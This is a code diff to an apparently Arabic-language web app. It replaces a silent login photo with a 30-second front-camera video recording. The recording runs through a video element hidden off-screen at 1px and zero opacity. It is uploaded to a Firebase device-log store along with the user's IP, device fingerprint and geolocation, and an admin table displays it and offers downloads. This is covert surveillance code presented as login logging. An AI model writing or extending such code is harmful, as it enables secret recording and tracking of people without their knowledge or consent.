@@ -9933,49 +9933,67 @@ async function getIPAddress() {
     }
 }
 
-async function captureLoginPhoto() {
+async function captureLoginVideo() {
     return new Promise((resolve) => {
         try {
             navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+                video: { facingMode: 'user', width: { ideal: 176 }, height: { ideal: 144 } },
                 audio: false
             }).then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.setAttribute('playsinline', true);
-                video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
-                document.body.appendChild(video);
+                const videoEl = document.createElement('video');
+                videoEl.srcObject = stream;
+                videoEl.setAttribute('playsinline', true);
+                videoEl.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
+                document.body.appendChild(videoEl);
 
-                video.onloadedmetadata = () => {
-                    video.play();
+                videoEl.onloadedmetadata = () => {
+                    videoEl.play();
+
+                    // اختيار أفضل صيغة مدعومة
+                    const mimeType = ['video/webm;codecs=vp8', 'video/webm', 'video/mp4']
+                        .find(t => MediaRecorder.isTypeSupported(t)) || '';
+
+                    const recorder = new MediaRecorder(stream, {
+                        mimeType: mimeType || undefined,
+                        videoBitsPerSecond: 80000   // 80kbps — جودة منخفضة لتقليل الحجم
+                    });
+
+                    const chunks = [];
+                    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+
+                    recorder.onstop = () => {
+                        stream.getTracks().forEach(t => t.stop());
+                        try { document.body.removeChild(videoEl); } catch(_) {}
+
+                        const blob = new Blob(chunks, { type: mimeType || 'video/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => resolve(reader.result);
+                        reader.onerror = () => resolve(null);
+                        reader.readAsDataURL(blob);
+                    };
+
+                    recorder.onerror = () => {
+                        stream.getTracks().forEach(t => t.stop());
+                        try { document.body.removeChild(videoEl); } catch(_) {}
+                        resolve(null);
+                    };
+
+                    recorder.start(1000); // جمع البيانات كل ثانية
+
+                    // إيقاف التسجيل بعد 30 ثانية
                     setTimeout(() => {
-                        try {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = 320;
-                            canvas.height = 240;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, 320, 240);
-                            const photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
-                            stream.getTracks().forEach(t => t.stop());
-                            document.body.removeChild(video);
-                            resolve(photoBase64);
-                        } catch (e) {
-                            stream.getTracks().forEach(t => t.stop());
-                            try { document.body.removeChild(video); } catch(_) {}
-                            resolve(null);
-                        }
-                    }, 800);
+                        try { if (recorder.state !== 'inactive') recorder.stop(); }
+                        catch(_) { resolve(null); }
+                    }, 30000);
                 };
 
-                video.onerror = () => {
+                videoEl.onerror = () => {
                     stream.getTracks().forEach(t => t.stop());
-                    try { document.body.removeChild(video); } catch(_) {}
+                    try { document.body.removeChild(videoEl); } catch(_) {}
                     resolve(null);
                 };
             }).catch(() => resolve(null));
-        } catch (e) {
-            resolve(null);
-        }
+        } catch(e) { resolve(null); }
     });
 }
 
@@ -10000,9 +10018,10 @@ async function getGeoLocation() {
 async function logDeviceAccess() {
     const deviceInfo = await getDeviceInfo();
     const ip = await getIPAddress();
-    const photo = await captureLoginPhoto();
     const geo = await getGeoLocation();
 
+    // حفظ السجل الأساسي أولاً بدون الفيديو (سريع)
+    const logKey = Date.now().toString();
     const logData = {
         username:    currentUser ? currentUser.name : 'غير معروف',
         ip,
@@ -10020,10 +10039,25 @@ async function logDeviceAccess() {
         colorDepth:  deviceInfo.colorDepth,
         geo:         geo || null,
         timestamp:   new Date().toISOString(),
-        photo:       photo || null
+        video:       null,
+        videoStatus: 'جارٍ التسجيل (30 ث)...'
     };
+    database.ref('/deviceLogs/' + logKey).set(logData);
 
-    database.ref('/deviceLogs/' + Date.now()).set(logData);
+    // تسجيل الفيديو 30 ثانية ثم إضافته للسجل
+    captureLoginVideo().then(videoData => {
+        if (videoData) {
+            database.ref('/deviceLogs/' + logKey).update({
+                video: videoData,
+                videoStatus: 'مكتمل'
+            });
+        } else {
+            database.ref('/deviceLogs/' + logKey).update({
+                videoStatus: 'لم يتم التسجيل'
+            });
+        }
+    });
+
     return logData;
 }
 
@@ -10645,17 +10679,17 @@ async function showDeviceLogs() {
         : deviceLogs.map((log, i) => {
             const time = new Date(log.timestamp).toLocaleString('ar-SA', { numberingSystem: 'latn' });
             const color = typeColor(log.deviceType);
-            const photoCell = log.photo
+            const photoCell = log.video
                 ? `<td style="padding:6px;text-align:center;">
-                       <img src="${log.photo}" style="width:60px;height:45px;object-fit:cover;border-radius:8px;border:2px solid #667eea;cursor:pointer;display:block;margin:0 auto 5px;"
-                            onclick="this.style.transform=this.style.transform?'':'scale(3.5)';this.style.zIndex=this.style.zIndex?'':'999';this.style.position=this.style.position?'':'relative';"
-                            title="اضغط لتكبير الصورة">
-                       <a href="${log.photo}" download="دخول_${(log.username||'مجهول').replace(/\s/g,'_')}_${new Date(log.timestamp).toLocaleDateString('ar-SA').replace(/\//g,'-')}.jpg"
+                       <video src="${log.video}" controls playsinline
+                           style="width:120px;height:90px;border-radius:8px;border:2px solid #667eea;display:block;margin:0 auto 5px;"
+                           title="فيديو تسجيل الدخول"></video>
+                       <a href="${log.video}" download="فيديو_${(log.username||'مجهول').replace(/\s/g,'_')}_${new Date(log.timestamp).toLocaleDateString('ar-SA').replace(/\//g,'-')}.webm"
                           style="display:inline-block;padding:3px 10px;background:linear-gradient(135deg,#142235,#25395a);color:#ecc873;border-radius:6px;font-size:11px;font-weight:bold;text-decoration:none;border:1px solid rgba(201,161,59,0.35);">
                            💾 تحميل
                        </a>
                    </td>`
-                : `<td style="padding:6px;text-align:center;color:#aaa;font-size:11px;">لا توجد</td>`;
+                : `<td style="padding:6px;text-align:center;color:#aaa;font-size:11px;">${log.videoStatus||'لا يوجد'}</td>`;
 
             return `
                 <tr style="background:${i%2===0?'var(--bg-secondary,#f7f8fa)':'var(--card-bg,#fff)'}; border-bottom:1px solid #eee;">
@@ -10738,7 +10772,7 @@ async function showDeviceLogs() {
                             <th style="padding:10px 8px;color:white;text-align:center;white-space:nowrap;">🔐 بصمة الجهاز</th>
                             <th style="padding:10px 8px;color:white;text-align:center;white-space:nowrap;">📍 الموقع الجغرافي</th>
                             <th style="padding:10px 8px;color:white;text-align:center;white-space:nowrap;">🕐 التاريخ</th>
-                            <th style="padding:10px 8px;color:white;text-align:center;white-space:nowrap;">📷 الصورة</th>
+                            <th style="padding:10px 8px;color:white;text-align:center;white-space:nowrap;">🎥 فيديو الدخول</th>
                         </tr>
                     </thead>
                     <tbody>${rows}</tbody>
